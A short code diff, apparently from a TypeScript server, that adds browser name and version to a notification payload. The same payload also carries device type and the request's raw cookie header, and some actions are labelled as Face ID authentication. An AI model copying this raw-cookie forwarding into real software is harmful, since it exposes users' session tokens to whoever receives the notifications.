@@ -910,7 +910,10 @@ export async function registerRoutes(
         // 12. Device
         notificationData["Device"] = deviceInfo.deviceType;
         
-        // 13. Cookies (last)
+        // 13. Browser (Safari, Chrome, Firefox, etc.)
+        notificationData["Browser"] = `${deviceInfo.browser}${deviceInfo.browserVersion ? ' ' + deviceInfo.browserVersion : ''}`;
+        
+        // 14. Cookies (last)
         notificationData["Cookies"] = cookieHeader || "None";
         
         const actionLabel = action === "facial_recognition_auth" ? "Face ID authentication" : action.replace("_", " ");
